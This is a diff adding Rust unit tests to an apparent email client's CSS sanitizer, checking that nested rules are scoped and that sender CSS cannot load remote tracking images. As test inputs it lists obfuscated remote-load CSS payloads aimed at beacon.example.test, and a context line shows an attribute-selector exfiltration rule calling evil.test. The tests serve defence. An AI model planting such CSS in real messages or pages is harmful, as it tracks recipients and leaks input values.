@@ -958,6 +958,44 @@ input[value^="a"] { background: url(http://evil.test/5) }
         assert_eq!(scope_selectors("body, p.x, html body .y, .z", "#m7"), "#m7, #m7 p.x, #m7 .y, #m7 .z");
     }
 
+    #[test]
+    fn nested_rules_stay_out_of_sender_css() {
+        let css = filter_css(".x{a:b; .y:not(&){display:none}}", "#m9");
+        assert_eq!(css, "#m9 .x{a:b}\n");
+        let css = filter_css(".x { color: red; .jolta-sig:not(&) { display: none; color: blue } @media (min-width: 1px) { .y { z: 1 } } }", "#m2");
+        assert!(!css.contains('&') && css.matches('{').count() == 1 && css.matches('}').count() == 1, "{css}");
+        assert!(!css.contains("jolta-sig") && !css.contains("display") && !css.contains("@media"), "{css}");
+        assert!(css.contains("#m2 .x{color: light-dark(red, "), "{css}");
+    }
+
+    #[test]
+    fn sender_css_loads_no_remote_image() {
+        for decl in [
+            r#"background-image: image-set("x-remote:https://beacon.example.test/a" 1x)"#,
+            r#"background-image: -webkit-image-set(url(cid:a) 1x, "x-remote:https://beacon.example.test/b" 2x)"#,
+            r#"background-image: cross-fade(url(cid:a), "x-remote:https://beacon.example.test/c", 50%)"#,
+            r"background: u\72l(x-remote:https://beacon.example.test/d)",
+            r"background: url(x-remote\3a https://beacon.example.test/e)",
+            r#"content: "x-remote:https://beacon.example.test/f""#,
+        ] {
+            assert_eq!(filter_declarations(decl), "", "{decl}");
+        }
+        let raw = "Subject: t\r\nContent-Type: text/html\r\n\r\n<style>.z { background-image: image-set(\"x-remote:https://beacon.example.test/css-a\" 1x) }</style>\
+            <div class=z>w</div><div style=\"background:u\\72l(x-remote:https://beacon.example.test/css-b)\">z</div>\
+            <img src=\"https://example.test/logo.png\">\r\n";
+        let out = render_thread(&[view(raw.as_bytes())], "");
+        assert!(!out.html.contains("beacon.example.test"), "{}", out.html);
+        assert_eq!(out.html.matches("x-remote:").count() as u32, out.remote_by_message[0], "every remote load is counted");
+    }
+
+    #[test]
+    fn newsletter_css_still_works() {
+        assert_eq!(filter_declarations("background: url(cid:image001.png@01DA2B3C.4D5E6F70) no-repeat"), "background: url(cid:image001.png@01DA2B3C.4D5E6F70) no-repeat");
+        assert_eq!(filter_declarations("background-image: url('data:image/gif;base64,R0lGOD')").contains("url('data:image/gif"), true);
+        let css = filter_css("@media only screen and (max-width: 600px) { .col { width: 100% !important; padding: 0 10px } }", "#m3");
+        assert_eq!(css, "@media only screen and (max-width: 600px){#m3 .col{width: 100% !important; padding: 0 10px}\n}\n");
+    }
+
     fn view(raw: &[u8]) -> MessageView<'_> {
         MessageView { id: 1, from: "a", to: "b", date: "today", snippet: "", raw, open: true, vip: false, protection: &Protection::None, cards: &[] }
     }
